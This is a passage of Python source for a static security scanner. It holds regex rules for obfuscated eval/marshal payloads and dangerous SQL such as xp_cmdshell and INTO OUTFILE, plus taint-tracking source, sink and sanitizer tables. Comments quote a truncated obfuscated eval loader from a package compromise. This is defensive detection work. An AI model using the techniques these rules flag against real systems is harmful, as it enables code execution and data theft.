  "CWE-506 · Supply chain"),
# Code a function computes from a long literal, run (0.1.8): eval, Function or
# vm's runIn…Context handed what a function — written into the call, or
# named — returns for a blob of at least 200 character codes or 1,000
# characters of text. The 2026 wave that compromised awaitly, executable-
# stories-vitest and three @redhat-cloud-services packages shipped a 4 MB
# index.js of `try{eval(function(s,n){…String.fromCharCode((c.charCodeAt(0)-
# b+n)%26+b)…}([40,107,99,…], n))}catch(e){}`; Dean Edwards' packer is
# eval(function(p,a,c,k,e,d){…}('<payload>', …)). Whatever the decoder, the
# file shows it, never the code it runs. None of the benchmark's 429
# popular packages has one.
R("SC-EVAL-DECODER", "Code decoded by its own function and run", "VULN", "CRITICAL", ("js",),
  r"\b(?:eval|(?:new\s+)?Function|runIn(?:This|New)?Context)\s*\(\s*(?:\(?\s*function\s*\([^()]{0,80}\)\s*\{"
  r"(?:[^{}]|\{[^{}]{0,2000}\}){0,2000}\}\s*\)?|[A-Za-z_$][\w$]*)\s*\(\s*"
  r"(?:\[\s*\d+(?:\s*,\s*\d+){199}|'[^'\n]{1000}|\"[^\"\n]{1000}|`[^`]{1000})",
  "Code a function computes from a long literal is run (eval, Function or vm).",
  "A decoder over a blob of character codes or text keeps a payload out of sight: the file shows the "
  "decoder, never the code it runs.",
  "Decode the blob and read what it runs; treat the package as hostile until then.",
  "CWE-506 · Supply chain"),
# Marshalled bytecode that is run, or that comes from bytes embedded or
# decoded in the code itself: `exec(marshal.load(f))`,
# `FunctionType(marshal.loads(b), …)`, `marshal.loads(b"\xe3…")`,
# `marshal.loads(zlib.decompress(base64.b64decode(…)))`. Loading marshal data
# on its own is ordinary: pytest's assertion-rewrite cache, jinja2's bytecode
# cache and setuptools all call marshal.load(f), and jinja2 builds code objects
# (0.1.1 flagged every one of them, making all three SUSPICIOUS). A payload
# decoded into a variable, marshalled and run later is the decode flow's
# SC-EVAL-DECODE; `exec(compile(src, path, "exec"))` runs source text and is
# not here either (--full still reports exec() as S-EVAL-PY).
R("SC-MARSHAL", "Marshalled bytecode execution", "VULN", "CRITICAL", ("py",),
  r"\b(?:exec|eval|FunctionType)\s*\(\s*" + _module_ref("marshal") + r"\s*\.\s*loads?\s*\("
  r"|\b" + _module_ref("marshal") + r"\s*\.\s*loads\s*\(\s*(?:b['\"]|"
  r"(?:(?:[\w$]+|" + _INLINE_IMPORT + r")\s*\.\s*)*"
  r"(?:b64decode|b32decode|b85decode|a85decode|decodebytes|decompress|fromhex|unhexlify|a2b_\w+|decode)\s*\()",
  "Marshalled bytecode is run, or loaded from bytes embedded or decoded in the code.",
  "Bytecode blobs evade source review — a common Python malware technique.",
  "Inspect the blob's origin; refuse opaque executable data in source trees.",
  "CWE-506 · Supply chain"),
R("SQL-XPCMD", "OS command execution via SQL", "VULN", "CRITICAL", ("sql",),
  r"\bxp_cmdshell\b",
  "xp_cmdshell runs operating-system commands from SQL Server.",
  "Enables full OS command execution from the database; a top post-exploitation target.",
  "Keep xp_cmdshell disabled; use a vetted, sandboxed job runner instead.",
  "CWE-78 · OWASP A03", flags=re.I),
R("SQL-DYNAMIC", "Dynamic SQL from concatenation", "VULN", "BLOCKER", ("sql",),
  # Review fix: every unbounded [^;]* used to restart at each statement head
  # ('SET @a = ' + 20k quotes: 7.6 s). The scans below stop at the next head
  # of the same kind, and the SET form scans to its FIRST quote, so each
  # character is examined a bounded number of times. A line matches iff the
  # old pattern matched, except `SET @a = 'x' SET @b = 1 + 2` (two
  # statements without ';'), which no longer counts as one.
  r"EXEC(?:UTE)?\s*\(\s*@?\w+\s*\+"
  r"|EXECUTE\s+IMMEDIATE\b(?:(?!EXECUTE\s+IMMEDIATE\b)[^;])*\|\|"
  r"|sp_executesql\b(?:(?!sp_executesql\b)[^;])*\+"
  r"|EXEC\s*\(\s*['\"][^']*['\"]\s*\+"
  r"|SET\s+@\w+\s*=(?:(?!SET\s+@)[^;'\"])*['\"](?:(?!SET\s+@)[^;])*(?:\+|\|\|)",
  "Dynamic SQL built by concatenating variables into the statement.",
  "String-built SQL executed with EXEC / EXECUTE IMMEDIATE / sp_executesql is SQL injection inside the database.",
  "Use parameterized dynamic SQL (sp_executesql with @params, or bind variables).",
  "CWE-89 · OWASP A03", flags=re.I),
R("SQL-CRED", "Hardcoded database credential", "VULN", "BLOCKER", ("sql",),
  r"(?:IDENTIFIED\s+BY\s+['\"][^'\"]+['\"]|PASSWORD\s*=?\s*['\"][^'\"]+['\"]|IDENTIFIED\s+BY\s+PASSWORD)",
  "Credential embedded in a SQL script.",
  "Passwords in DDL scripts leak through version control and backups.",
  "Provision credentials out-of-band (secrets manager / vault), not in checked-in SQL.",
  "CWE-798 · OWASP A07",
  # Verdict-integrity fix (audit C2): word-bounded placeholder noise words, so
  # a real credential on a line that merely mentions "example" is not skipped.
  skip=r"\bplaceholder\b|\bexample\b|\bdummy\b|\bmock\b|\bxxxx+\b", flags=re.I),
R("SQL-GRANT-ALL", "Excessive privilege grant", "HOTSPOT", "MAJOR", ("sql",),
  r"\bGRANT\s+ALL\b|\bWITH\s+GRANT\s+OPTION\b",
  "GRANT ALL / WITH GRANT OPTION hands over broad privileges.",
  "Violates least privilege; a compromised account inherits everything.",
  "Grant only the specific privileges the role needs.",
  "CWE-732 · OWASP A01", flags=re.I),
R("SQL-GRANT-PUBLIC", "Grant to PUBLIC", "HOTSPOT", "MAJOR", ("sql",),
  r"\bGRANT\b(?:(?!\bGRANT\b)[^;])*\bTO\s+PUBLIC\b",   # linear: stops at the next GRANT
  "Privilege granted to PUBLIC (every user).",
  "PUBLIC grants apply to all current and future accounts, including low-trust ones.",
  "Grant to a specific role instead of PUBLIC.",
  "CWE-732 · OWASP A01", flags=re.I),
R("SQL-FILE", "Filesystem access from SQL", "VULN", "CRITICAL", ("sql",),
  r"\bINTO\s+(?:OUTFILE|DUMPFILE)\b|\bLOAD_FILE\s*\(|\bLOAD\s+DATA\s+INFILE\b",
  "SQL reads/writes the server filesystem (OUTFILE / LOAD_FILE).",
  "A classic data-exfiltration and webshell-drop primitive in SQL injection exploitation.",
  "Disable FILE privilege; never build these paths from untrusted input.",
  "CWE-73 · OWASP A03", flags=re.I),
R("SQL-OPENROWSET", "Ad-hoc remote data access", "HOTSPOT", "MAJOR", ("sql",),
  r"\b(?:OPENROWSET|OPENQUERY|OPENDATASOURCE)\s*\(",
  "OPENROWSET/OPENQUERY perform ad-hoc external connections.",
  "Can reach arbitrary hosts/files and is abused for lateral movement.",
  "Disable Ad Hoc Distributed Queries; use configured linked servers with least privilege.",
  "CWE-610", flags=re.I),
R("SQL-FK-OFF", "Integrity checks disabled", "HOTSPOT", "MAJOR", ("sql",),
  r"SET\s+FOREIGN_KEY_CHECKS\s*=\s*0|NOCHECK\s+CONSTRAINT|SET\s+CONSTRAINTS\s+ALL\s+DEFERRED",
  "Referential-integrity enforcement is turned off.",
  "Disabling constraints allows orphaned/inconsistent data to be written.",
  "Re-enable checks immediately after the bulk operation; scope it tightly.",
  "CWE-20", flags=re.I),
R("SQL-TRUSTWORTHY", "TRUSTWORTHY database", "HOTSPOT", "MAJOR", ("sql",),
  r"SET\s+TRUSTWORTHY\s+ON",
  "TRUSTWORTHY ON enables privilege escalation paths in SQL Server.",
  "Combined with impersonation it can lead to sysadmin escalation.",
  "Leave TRUSTWORTHY OFF; sign modules instead.",
  "CWE-269", flags=re.I),
R("SQL-NOLOCK", "Dirty-read hint", "SMELL", "MINOR", ("sql",),
  r"WITH\s*\(\s*NOLOCK\s*\)|READ\s+UNCOMMITTED",
  "NOLOCK / READ UNCOMMITTED permits dirty reads.",
  "Returns uncommitted, possibly inconsistent data; a common source of subtle bugs.",
  "Use an appropriate isolation level (e.g. READ COMMITTED SNAPSHOT).",
  "Reliability", flags=re.I),
R("SQL-SELECT-STAR", "SELECT *", "SMELL", "MINOR", ("sql",),
  r"\bSELECT\s+\*",
  "SELECT * fetches all columns.",
  "Breaks silently on schema changes and moves unneeded data.",
  "List the columns you actually need.",
  "Maintainability", flags=re.I),
]

TEXT_RULES = [
# linear: the optional parameter list carries its trailing whitespace (the
# old `\s*(…)?\s*` split a whitespace run every way: 'catch' + 150,000
# newlines took 21.7 s in one regex call, which the time budget can't stop)
R("B-EMPTY-CATCH", "Empty catch block", "BUG", "MAJOR", ("js",),
  r"catch\s*(?:\([^()]*\)\s*)?\{\s*\}",
  "Exception swallowed by empty catch.",
  "Errors vanish silently, making failures undiagnosable.",
  "Handle the error or at least log it.",
  "Reliability"),
R("B-EXCEPT-PASS", "except: pass", "BUG", "MAJOR", ("py",),
  # linear: the old `:\s*\n\s*` backtracked over every newline run, and
  # `except[^\n:]*` restarted at each 'except' on a long line
  r"except(?:(?!except)[^\n:])*:[^\S\n]*\n\s*pass\b",
  "Exception swallowed with pass.",
  "Errors vanish silently, making failures undiagnosable.",
  "Handle the error or at least log it.",
  "Reliability"),
# SQL-DELETE-NOWHERE / SQL-UPDATE-NOWHERE used to be tempered-dot patterns
# ((?:(?!\bWHERE\b|;).)*; with re.S) applied over the whole file. On
# adversarial input (thousands of unterminated DELETE statements, no ';')
# every match attempt scans to EOF and backtracks: O(starts × file) — 51 s CPU
# on 280 KB, extrapolating to ~40 min at the 2 MB file cap (audit F11). The
# patterns below are deliberately statement-anchored and linear: after the
# DELETE/UPDATE keyword they match ONE identifier and at most one SET keyword,
# never scanning to EOF. The "no WHERE before the statement ends" decision is
# made by the linear per-statement pre-scan in scan_sql_nowhere() — one
# O(n) pass over the file — not by the regex.
R("SQL-DELETE-NOWHERE", "DELETE without WHERE", "BUG", "MAJOR", ("sql",),
  r"\bDELETE\s+FROM\s+[\w.\"\[\]`]+",
  "DELETE has no WHERE clause — it removes every row.",
  "An unqualified DELETE wipes the whole table; usually a mistake outside teardown scripts.",
  "Add a WHERE clause, or use TRUNCATE deliberately if a full wipe is intended.",
  "CWE-665", flags=re.I),
R("SQL-UPDATE-NOWHERE", "UPDATE without WHERE", "BUG", "MAJOR", ("sql",),
  r"\bUPDATE\s+[\w.\"\[\]`]+\s+SET\b",
  "UPDATE has no WHERE clause — it changes every row.",
  "An unqualified UPDATE rewrites the entire table.",
  "Add a WHERE clause to scope the update.",
  "CWE-665", flags=re.I),
]

# ---------------- Taint tracking (lightweight, intra-file) ----------------
# Sources: user input and decode functions. Sinks: dangerous calls.
TAINT_SOURCES = {
    # Flask / Werkzeug request data (query_string, get_data, stream, full_path
    # too), Django's (GET, POST, COOKIES, META, FILES, body) and Starlette's,
    # FastAPI's and Django REST framework's (query_params, path_params, a
    # websocket's messages); the parameters a route handler takes from the
    # request (_route_params)
    "py": re.compile(r"request\.(args|form|values|json|data|cookies|headers|files|get_json|get_data"
                     r"|query_string|stream|full_path|GET|POST|COOKIES|META|FILES|body|query_params|path_params)"
                     r"|\b(?:websocket|ws)\.receive_(?:text|json|bytes)\s*\("
                     r"|input\s*\(|sys\.argv|b64decode\s*\(|zlib\.decompress\s*\("),
    # Express's request (`req`, or `request` as a name of its own): the
    # parsed parts, the URL and host, and a header read with req.get()
    "js": re.compile(r"req\.(query|body|params|headers|cookies|signedCookies|files?|originalUrl|url|path|hostname)"
                     r"|(?<![\w$.])request\.(query|body|params|headers|cookies)|\breq\.(?:get|header|param)\s*\("
                     r"|process\.argv|location\.(search|hash|href)|document\.URL|new\s+URLSearchParams(?!\s*\(\s*\))"
                     r"|atob\s*\(|unescape\s*\(|decodeURIComponent\s*\("),
}
# (id-suffix, sink regex, category, severity, cwe, fix)
TAINT_SINKS = {
    "py": [
        ("CMD", re.compile(r"os\.(system|popen)\s*\(|subprocess\.(run|call|check_output|check_call|Popen)\s*\("
                           r"|asyncio\.create_subprocess_shell\s*\("),
         "command injection", "CRITICAL", "CWE-78",
         "Validate/allowlist the value; pass args as a list with shell=False."),
        ("CODE", re.compile(r"(?<![\w.])(eval|exec)\s*\("),
         "code injection", "CRITICAL", "CWE-95",
         "Never execute untrusted strings; use safe parsing."),
        # DB-API cursors, Django's Manager.raw and RawSQL (the query is their
        # first argument) …
        ("SQL", re.compile(r"\.(execute|executemany|executescript)\s*\(|\.objects\.raw\s*\(|(?<![\w.])RawSQL\s*\("),
         "SQL injection", "BLOCKER", "CWE-89",
         "Use parameterized queries."),
        # … and Django's QuerySet.extra(), whose SQL is in its keywords
        ("SQL", re.compile(r"\.extra\s*\(\s*(?:select|where|tables|order_by)\s*="),
         "SQL injection", "BLOCKER", "CWE-89",
         "Use parameterized queries."),
        ("PATH", re.compile(r"(?<![\w.])open\s*\(|(?:codecs|io|os)\.open\s*\(|send_file\s*\("
                            r"|(?<![\w.])FileResponse\s*\("
                            r"|shutil\.(?:copy|copy2|copyfile|copytree|move|rmtree)\s*\("
                            r"|os\.(?:remove|unlink|rmdir|removedirs|rename|replace|listdir|scandir)\s*\("),
         "path traversal", "MAJOR", "CWE-22",
         "Resolve the path and verify it stays inside an allowed base directory."),
        # Flask joins the file name to the directory safely (safe_join): the
        # directory is the sink
        ("PATH", re.compile(r"send_from_directory\s*\("),
         "path traversal", "MAJOR", "CWE-22",
         "Resolve the path and verify it stays inside an allowed base directory."),
        ("SSRF", re.compile(r"requests\.(get|post|put|delete|head|request)\s*\(|urlopen\s*\("
                            r"|httpx\.(?:get|post|put|patch|delete|head|request|stream)\s*\("),
         "server-side request forgery", "MAJOR", "CWE-918",
         "Allowlist target hosts and schemes; block internal addresses."),
        ("REDIR", re.compile(r"(?<![\w.])redirect\s*\(|flask\.redirect\s*\("
                             r"|HttpResponse(?:Permanent)?Redirect\s*\(|(?<![\w.])RedirectResponse\s*\("),
         "open redirect", "MAJOR", "CWE-601",
         "Allowlist redirect targets or use relative paths."),
        ("SSTI", re.compile(r"render_template_string\s*\(|(?<![\w.])jinja2\.Template\s*\("
                            r"|(?:\b\w*[eE]nv(?:ironment)?|Environment\s*\([^()]{0,200}\))\s*\.\s*from_string\s*\("),
         "template injection", "CRITICAL", "CWE-1336",
         "Pass data as template parameters, never into template source."),
        # a Template class imported from jinja2, mako or django.template (not
        # string.Template): only in a file that imports one (_TEMPLATE_IMPORT_RE)
        ("SSTI", re.compile(r"(?<![\w.])Template\s*\("),
         "template injection", "CRITICAL", "CWE-1336",
         "Pass data as template parameters, never into template source."),
        # a response body built from the value (Flask / Werkzeug, Django,
        # Starlette / FastAPI), or the value marked as safe HTML; a Flask
        # view's own `return` is checked too (taint_scan)
        ("XSS", re.compile(r"make_response\s*\(|(?<![\w.])Response\s*\(|(?<![\w.])HttpResponse\s*\("
                           r"|(?<![\w.])HTMLResponse\s*\(|(?<![\w.])Markup\s*\(|mark_safe\s*\("
                           r"|(?<![\w.])SafeString\s*\("),
         "cross-site scripting", "MAJOR", "CWE-79",
         "Escape the value (or render it through an autoescaping template) before it is returned."),
    ],
    "js": [
        ("CMD", re.compile(r"\b(exec|execSync|spawn|spawnSync)\s*\("),
         "command injection", "CRITICAL", "CWE-78",
         "Use execFile/spawn with an args array; validate the value."),
        ("CODE", re.compile(r"(?<![\w.])eval\s*\(|new\s+Function\s*\("
                            r"|\bvm\.(?:runInNewContext|runInThisContext|runInContext|compileFunction)\s*\("
                            r"|new\s+vm\.Script\s*\("),
         "code injection", "CRITICAL", "CWE-95",
         "Never execute untrusted strings; use JSON.parse or a dispatch map."),
        # driver queries, and the raw SQL of knex and Sequelize
        ("SQL", re.compile(r"\.(query|execute)\s*\(|\.(?:whereRaw|havingRaw|orderByRaw|joinRaw|groupByRaw|fromRaw)\s*\("
                           r"|\bknex\.raw\s*\(|\bsequelize\.literal\s*\("),
         "SQL injection", "BLOCKER", "CWE-89",
         "Use placeholders with a parameter array."),
        # (not Express's sendFile / download given a `root`: send refuses a
        # path that climbs out of it)
        ("PATH", re.compile(r"\.(sendFile|download)\s*\((?!(?:[^()]|\([^()]*\))*,\s*\{[^{}]*\broot\s*[:,}])"
                            r"|readFile(Sync)?\s*\(|createReadStream\s*\("),
         "path traversal", "MAJOR", "CWE-22",
         "Resolve the path and verify it stays inside an allowed base directory."),
        # a file written, removed or listed (the path is the first argument)
        ("PATH", re.compile(r"\bfs(?:\.promises)?\.(?:writeFile|appendFile|unlink|rm|rmdir|mkdir|readdir|rename"
                            r"|copyFile|createWriteStream)(?:Sync)?\s*\("),
         "path traversal", "MAJOR", "CWE-22",
         "Resolve the path and verify it stays inside an allowed base directory."),
        ("SSRF", re.compile(r"\bfetch\s*\(|axios(\.(get|post|put|delete|request))?\s*\(|https?\.(get|request)\s*\("
                            r"|\bgot(?:\.(?:get|post|put|patch|delete|head|stream))?\s*\(|\bneedle\s*\("),
         "server-side request forgery", "MAJOR", "CWE-918",
         "Allowlist target hosts and schemes; block internal addresses."),
        ("REDIR", re.compile(r"\.redirect\s*\(|\b(?:res|response)\.location\s*\("),
         "open redirect", "MAJOR", "CWE-601",
         "Allowlist redirect targets or use relative paths."),
        # template source compiled or rendered: EJS, Pug, Handlebars,
        # Mustache, Nunjucks, doT, lodash
        ("SSTI", re.compile(r"\b(?:ejs|pug|jade|Handlebars|handlebars|Mustache|mustache|nunjucks|doT|_)"
                            r"\.(?:render|renderString|compile|template)\s*\("),
         "template injection", "CRITICAL", "CWE-1336",
         "Pass data as template parameters, never into template source."),
        ("XSS", re.compile(r"\.innerHTML\s*=|document\.write\s*\("),
         "cross-site scripting", "MAJOR", "CWE-79",
         "Escape/sanitize before rendering; prefer textContent."),
        # an Express or Node response body (Express sends a string as HTML;
        # a whole parsed object, `res.send(req.query)`, as JSON)
        ("XSS", re.compile(r"\b(?:res|response)(?:\.(?:status|type|set|header|append|vary|cookie|clearCookie)"
                           r"\s*\([^()]{0,200}\))*\.(?:send|write|end)\s*\("
                           r"(?!\s*(?:req|request)\.(?:query|body|params|headers|cookies|signedCookies)\s*\))"),
         "cross-site scripting", "MAJOR", "CWE-79",
         "Escape/sanitize before rendering; prefer textContent."),
    ],
}
# A response whose content type is set to one a browser does not render as
# HTML (`HttpResponse(body, content_type="text/plain")`, `Response(data,
# mimetype="application/json")`, `media_type=` in Starlette) is no XSS sink.
_NON_HTML_TYPE_RE = re.compile(r"""\b(?:content_type|mimetype|media_type)\s*=\s*[rRuU]?["'](?![^"']*(?:html|xml|svg))""")
# … nor is an Express response whose chain sets one first
# (`res.type("text/plain").send(q)`, `res.set("Content-Type", "application/json").end(q)`).
_NON_HTML_CHAIN_RE = re.compile(r"""\.(?:type\s*\(|(?:set|header)\s*\(\s*["'`][Cc][Oo][Nn][Tt][Ee][Nn][Tt]-[Tt][Yy][Pp][Ee]"""
                                r"""["'`]\s*,)\s*["'`](?![^"'`]*(?:html|xml|svg))""")
# The Template row of TAINT_SINKS["py"] counts only in a file that imports a
# Template class from a template engine.
_TEMPLATE_SINK_RE = next(row[1] for row in TAINT_SINKS["py"] if row[1].pattern == r"(?<![\w.])Template\s*\(")
_TEMPLATE_IMPORT_RE = re.compile(
    r"(?<![^\n])[ \t]*from[ \t]+(?:jinja2|mako\.template|django\.template)[ \t]+import\b[^\n]*\bTemplate\b")
# Review fix (shared semantics 12): a Python annotated assignment
# `x: T = source` binds x (the optional `: T` part), and a JS destructuring
# declaration binds every name in its pattern (_JS_DESTRUCT_RE below) —
# `target: str = request.args.get("next")` and `const { file } = req.query`
# used to leave their names untainted.
# An augmented assignment (`html += f"<p>{q}</p>"`) taints its target too.
ASSIGN_RE = {
    "py": re.compile(r"^\s*([A-Za-z_]\w*)\s*(?::[^=\n]*|[-+*/%&|^@]|//|\*\*|<<|>>)?=(?![=])\s*(.+)"),
    "js": re.compile(r"^\s*(?:(?:const|let|var)\s+)?([A-Za-z_$][\w$]*)\s*"
                     r"(?:[-+*/%&|^]|\*\*|<<|>>>?|&&|\|\||\?\?)?=(?![=>])\s*(.+)"),
}
# the augmented forms (`x += y`, `x ||= y`): the target keeps what it held
_AUG_ASSIGN_RE = {
    "py": re.compile(r"^\s*[A-Za-z_]\w*\s*(?:[-+*/%&|^@]|//|\*\*|<<|>>)="),
    "js": re.compile(r"^\s*[A-Za-z_$][\w$]*\s*(?:[-+*/%&|^]|\*\*|<<|>>>?|&&|\|\||\?\?)="),
}
# one-level object / array pattern: `{ a, b: c, d = 1, ...e }` / `[a, , b = 2, ...c]`
_JS_DESTRUCT_RE = re.compile(
    r"^\s*(?:(?:const|let|var)\s+)?(\{[^{}]*\}|\[[^\[\]]*\])\s*=(?![=>])\s*(.+)")
_JS_BINDING_RE = re.compile(r"[A-Za-z_$][\w$]*")


def _destructured_names(pattern):
    """Names bound by a one-level JS destructuring pattern:
    `{ a, b: c, d = 1, ...e }` -> [a, c, d, e]; `[a, , b = 2, ...c]` -> [a, b, c]."""
    names = []
    for part in pattern[1:-1].split(","):
        part = part.strip()
        if part.startswith("..."):
            part = part[3:].strip()
        elif pattern[0] == "{" and ":" in part:
            part = part.split(":", 1)[1].strip()
        part = part.split("=", 1)[0].strip()
        if _JS_BINDING_RE.fullmatch(part):
            names.append(part)
    return names


def _assignment(line, lang):
    """(names bound, right-hand side) of an assignment line, or (None, None).
    A Python keyword never counts as a name (`else: x = …` is not an
    annotated assignment to `else`)."""
    m = ASSIGN_RE[lang].match(line)
    if m:
        name = m.group(1)
        if lang == "py" and (keyword.iskeyword(name) or (
                keyword.issoftkeyword(name) and line[m.end(1):].lstrip().startswith(":"))):
            return None, None
        return [name], m.group(2)
    if lang == "js":
        dm = _JS_DESTRUCT_RE.match(line)
        if dm:
            names = _destructured_names(dm.group(1))
            if names:
                return names, dm.group(2)
    return None, None

# A value put into a container — an element assigned (`d["k"] = q`,
# `arr[i] = q`) or added (`xs.append(q)`, `arr.push(q)`) — taints the
# container: what is read from it may be the value. A weak update: the
# container keeps what it held.
_CONTAINER_WRITE_RE = {
    "py": re.compile(r"^\s*([A-Za-z_]\w*)\s*(?:\[[^\[\]\n]*\]\s*(?:[-+*/%&|^@]|//|\*\*|<<|>>)?=(?!=)"
                     r"|\.\s*(?:append|extend|insert|add)\s*\()\s*(.+)"),
    "js": re.compile(r"^\s*([A-Za-z_$][\w$]*)\s*(?:\[[^\[\]\n]*\]\s*(?:[-+*/%&|^]|\*\*|<<|>>>?|&&|\|\||\?\?)?=(?![=>])"
                     r"|\.\s*(?:push|unshift)\s*\()\s*(.+)"),
}


# An element assigned under a literal key (`d["k"] = v`) is followed by its
# key too: reading `d["other"]` after `d["other"] = "fixed"` reads no
# untrusted data though `d` holds some. Only plain assignments: an
# augmented one, a computed key or a method keeps the container's taint.
_KEYED_WRITE_RE = re.compile(r"""^\s*([A-Za-z_$][\w$]*)\s*\[\s*(["'])([^"'\\\n]*)\2\s*\]\s*=(?![=>])""")
_KEYED_READ_RE = re.compile(r"""(?<![\w$.])([A-Za-z_$][\w$]*)\s*\[\s*(["'])([^"'\\\n]*)\2\s*\]""")


def _keyed_reads(text, keyed):
    """`text` with its reads of container elements known to hold no
    untrusted data (see above) blanked. `keyed`: {container: {key: clean
    set, or None for a value with no untrusted data}}."""
    if not keyed or "[" not in text:
        return text

    def repl(m):
        keys = keyed.get(m.group(1))
        if keys is None or m.group(3) not in keys or keys[m.group(3)] is not None:
            return m.group()
        return " " * len(m.group())
    return _KEYED_READ_RE.sub(repl, text)


def _container_write(line, lang):
    """(container name, the value written) of a line that puts a value into
    a container (see above), or (None, None)."""
    m = _CONTAINER_WRITE_RE[lang].match(line)
    if not m or (lang == "py" and keyword.iskeyword(m.group(1))):
        return None, None
    added = line[m.end(1):m.start(2)].rstrip().endswith("(")       # xs.append(…): its arguments
    return m.group(1), (_extent(m.group(2)) if added else m.group(2))

STRING_LIT_RE = re.compile(r"\"[^\"]*\"|'[^']*'|`[^`]*`")

# What taint reads of a text: its string literals removed, except the fields
# of a Python f-string (`f"/srv/{name}"`, prefix f / rf / fr in either case)
# and of a JavaScript template literal no tag reads (`ls ${dir}` — a tagged
# sql`…${x}` template is parameterized): those are code whose value becomes
# part of the string. A field is the text between one-level braces;
# `{{` / `}}` in an f-string are literal braces.
_FIELD_RE = {"py": re.compile(r"\{([^{}]*)\}"), "js": re.compile(r"\$\{([^{}]*)\}")}
# A Python literal with its prefix (r, b, u, f or a pair of them), which is
# part of the literal and not a name: `os.system(f"ls {d}")` reads `d`, not a
# variable called f.
_PY_LIT_RE = re.compile(r"(?:(?<![A-Za-z0-9_])([rRbBuUfF]{1,2}))?(\"[^\"]*\"|'[^']*'|`[^`]*`)")
_ASCII_WORD = frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_$")
_JS_TAG_KEYWORDS = frozenset(("return", "typeof", "case", "in", "of", "yield", "await", "throw",
                              "delete", "void", "else", "do", "new"))


def _js_tagged(text, start):
    """True when the backtick at `start` opens a tagged template (sql`…`)."""
    j = start
    while j > 0 and text[j - 1] in " \t":
        j -= 1
    if j == 0 or not (text[j - 1] in _ASCII_WORD or text[j - 1] in ")]"):
        return False
    k = j
    while k > 0 and text[k - 1] in _ASCII_WORD:
        k -= 1
    return text[k:j] not in _JS_TAG_KEYWORDS


# An element looked up by a key (`users[req.params.id]`, `COMMANDS[q]`) is
# the container's, not the key's: taint reads a subscript's container and
# not its index (`request.args["q"]` is still request data), and the same
# for the index arguments of JavaScript's slice(), substring(), at() …
# (`names.slice(from, to)`). Innermost subscripts first, at most
# _SUBSCRIPT_PASSES levels deep; a `[` after a keyword opens a list
# (`return [q]`, `x in [q]`), not a subscript.
_SUBSCRIPT_RE = re.compile(r"((?<![\w$])[\w$]+|[)\]])(\s*)\[[^\[\]]*\]")
_INDEX_ARGS_RE = re.compile(r"(\.\s*(?:slice|substring|substr|at|charAt|charCodeAt|codePointAt)\s*\()([^()]*)\)")
_SUBSCRIPT_PASSES = 4
_NOT_SUBSCRIPTED = frozenset((
    "return", "yield", "in", "await", "else", "and", "or", "not", "is", "if", "lambda", "assert", "del",
    "typeof", "case", "of", "new", "delete", "void", "throw", "instanceof", "print", "elif", "while", "for",
    "with", "from", "import", "raise", "except", "do"))


def _subscript_repl(m):
    if m.group(1) in _NOT_SUBSCRIPTED:
        return m.group()
    return m.group(1) + m.group(2) + " " * (len(m.group()) - len(m.group(1)) - len(m.group(2)))


def _drop_indexes(text):
    """`text` with its subscripts' indexes blanked (see above)."""
    if "." in text:
        text = _INDEX_ARGS_RE.sub(lambda m: m.group(1) + " " * len(m.group(2)) + ")", text)
    for _ in range(_SUBSCRIPT_PASSES):
        if "[" not in text:
            break
        new = _SUBSCRIPT_RE.sub(_subscript_repl, text)
        if new == text:
            break
        text = new
    return text


def _taint_code(text, lang):
    """`text` without its string literals and subscripts' indexes, as taint
    reads it (see above)."""
    if lang == "py":
        def py_repl(m):
            if (m.group(1) or "").lower() not in ("f", "rf", "fr") or m.group(2)[0] == "`":
                return ""
            body = m.group(2)[1:-1].replace("{{", "  ").replace("}}", "  ")
            return " " + " ".join(_FIELD_RE["py"].findall(body)) + " "
        return _drop_indexes(_PY_LIT_RE.sub(py_repl, text))

    def js_repl(m):
        lit = m.group()
        if lit[0] != "`" or _js_tagged(text, m.start()):
            return ""
        return " " + " ".join(_FIELD_RE["js"].findall(lit[1:-1])) + " "
    return _drop_indexes(STRING_LIT_RE.sub(js_repl, text))


# ---------------- Sanitizer model (SonarQube / Semgrep style) ----------------
# Values passed through a sanitizer stop being tainted. "full" sanitizers
# (numeric coercion) cleanse every sink; "partial" sanitizers (keyed by sink
# suffix) cleanse one category. Body pattern allows one level of nested parens
# so int(request.args.get("id")) is recognized.
_SAN_BODY = r"(?:[^()]|\([^()]*\))*"
# A record looked up by a value (Django's get_object_or_404(Model, pk=q),
# Model.objects.filter(name=q); Flask-SQLAlchemy's Model.query.filter_by(…),
# SQLAlchemy's session.execute(…) / .get / .scalars) is the database's, not
# the value: the ORM binds the value as a parameter, and what it returns is
# not request data. Nor is what a file read gives (`open(p).read()`,
# `fs.readFileSync(p)`): the path is the read's own path-traversal sink.
_FULL_SAN = {
    "py": re.compile(r"(?:int|float|bool|complex|uuid\.UUID|ipaddress\.ip_address|get_object_or_404|get_list_or_404"
                     r"|\.objects\.\w+|\.query\.\w+|\bsession\.(?:query|get|scalars?|execute))\s*\(" + _SAN_BODY + r"\)"
                     r"|(?<![\w.])open\s*\(" + _SAN_BODY + r"\)\s*\.\s*read(?:lines)?\s*\(\s*\)"),
    "js": re.compile(r"(?:parseInt|parseFloat|Number|readFileSync)\s*\(" + _SAN_BODY + r"\)"),
}
_PARTIAL_SAN = {
    "py": {
        "CMD": re.compile(r"(?:shlex|pipes)\.quote\s*\(" + _SAN_BODY + r"\)"),
        # escape(), escape_html(), …; an autoescaping template and the JSON
        # and URL builders encode the value too. Not unescape().
        "XSS": re.compile(r"(?<!\w)(?:html\.escape|markupsafe\.escape|cgi\.escape|escape\w*|bleach\.clean"
                          r"|conditional_escape|format_html|render_template|render_to_string|TemplateResponse"
                          r"|jsonify|url_for)\s*\(" + _SAN_BODY + r"\)"),
        "PATH": re.compile(r"(?:os\.path\.basename|basename|secure_filename|safe_join)\s*\(" + _SAN_BODY + r"\)"),
        # url_for and Django's reverse() build a URL on this site from a
        # view's name (Flask's, Starlette's request.url_for); the Referer is
        # the page the user came from (a redirect "back")
        "REDIR": re.compile(r"(?<![\w.])(?:[A-Za-z_][\w.]*\.)?(?:url_for|reverse|reverse_lazy)\s*\(" + _SAN_BODY + r"\)"
                            r"|request\.(?:META\.get|headers\.get)\s*\(\s*[\"'](?:HTTP_REFERER|[Rr]eferr?er)[\"']"
                            + _SAN_BODY + r"\)|request\.META\s*\[\s*[\"']HTTP_REFERER[\"']\s*\]"),
    },
    "js": {
        "XSS": re.compile(r"(?:DOMPurify\.sanitize|encodeURIComponent|escapeHtml|sanitizeHtml|he\.(?:encode|escape)"
